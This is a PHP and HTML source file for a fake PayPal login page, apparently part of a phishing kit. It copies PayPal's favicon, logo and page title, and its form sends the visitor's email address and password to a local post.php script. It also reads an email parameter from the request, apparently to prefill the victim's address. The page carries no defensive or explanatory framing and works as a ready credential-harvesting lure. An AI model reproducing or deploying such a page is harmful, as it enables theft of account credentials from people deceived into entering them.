<?php
$email = @$_REQUEST['email'];

?>
<!DOCTYPE html>
<head>
<link rel="icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
<html>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Log in to your Paypal account</title>
<style>
body {
  font-family: Arial;
  padding: 0px;
  margin: 0px;
  text-align: center;
  height: auto;
  width: auto;
}

form {
  font-family: Arial;
  text-align: center;
  height: auto;
  width: auto;
}

input[type=text], input[type=password] {
  width: 100%;
  font-family: Yu Gothic UI Semibold;
  font-size: 15px;
  background-color: white;
  color: #000000;
  padding: 12px;
  border-radius: 4px;
  margin: 8px;
  margin-left: 0px;
  margin-right: 0px;
  border: 1px solid #696969;
  box-sizing: border-box;
  height: 45px;
}

button {
  background-color: #0073B1;
  color: white;
  padding: 12px;
  margin-top: 12px;
  margin-left: 0px;
  margin-right: 0px;
  margin-bottom: 20px;
  border-radius: 4px;
  border: none;
  cursor: pointer;
  width: 100%;
  height: 42px;
  font-family: Arial;
  font-size: 16px;
  text-align: center;
}

button:hover {
  opacity: 0.9567;
}

.imgcontainer {
  padding-top: 0px;
  padding-left: 0px;
  padding-right: 0px;
  padding-bottom: 0px;
  margin-top: 0px;
  margin-left: 0px;
  margin-right: 0px;
  margin-bottom: 20px;
}

.imgcontainer1 {
  padding-top: 0px;
  padding-left: 0px;
  padding-right: 0px;
  padding-bottom: 0px;
  margin-top: 8.5%;
  margin-left: 0px;
  margin-right: 0px;
  margin-bottom: 20px;
}

.container {
  position: relative;
  padding: 36px;
  margin: auto;
  width: 390px;
  height: auto;
  border: 1px solid #f0f0f0;
  border-radius: 4px;
}

.container2 {
  padding: 0px;
  margin: auto;
  width: auto;
  height: auto;
}

.container3 {
  position: absolute;
  top: 68%;
  left: 45%;
  padding: 0px;
  margin: auto;
  width: 40px;
  height: 40px;
  background-color: white;
}

.footer__base {
  position: fixed;
  left: 0;
  bottom: 0;
  color: #000000;
  padding: 8px;
  background-color: #f5f5f5;
  font-family: Arial;
  font-size: 5px;
  height: auto;
  text-align: center;
  width: 100%;
}

span.psw {
  float: right;
  padding-top: 16px;
}

@media screen and (max-width: 300px) {
  span.psw {
     display: block;
     float: none;
  }
}
</style>
</head>
<body>

		<div class="imgcontainer1">
		</div>

<div class="container2">
	
		<form method="post" action="post.php">
		<div class="container">
		<div class="imgcontainer">
		<img src="https://i.ibb.co/09CXQmD/paypal.png" alt="logo">
		</div>

		<input id="text" type="text" placeholder="Email address" name="email" required>

    		<input id="password" type="password" placeholder="Password" name="password" required>

  		<button type="submit"><b>Log In</b></button>

    		<p style="font-size: 15px; font-family: Arial; color: #0073B1; font-weight: 500; padding-top: 8px; padding-bottom: 14px; text-decoration: none; margin:auto;">Having trouble logging in?</p>
<p></p><p></p>
		<div class="container3"><p style="color: #919191;">or</p></div>
<hr>

  		<button type="submit" style="color: #000000; background-color: #e8e8e8;"><b>Sign Up</b></button>
	</div>

</form>
</div>
<div class="footer__base">
<p font-weight: 600;>
<a href="#" style="color: #000000; padding: 8px; font-size: 11px; font-weight: 400; text-decoration: none;">Contact Us</a>
<a style="color: #000000; padding: 8px; font-size: 11px; font-weight: 400; text-decoration: none;">Privacy</a>
<a style="color: #000000; padding: 8px; font-size: 11px; font-weight: 400; text-decoration: none;">Legal</a>
<a style="color: #000000; padding: 8px; font-size: 11px; font-weight: 400; text-decoration: none;">Worldwide</a>
</p>
</div>

</body>
</html>
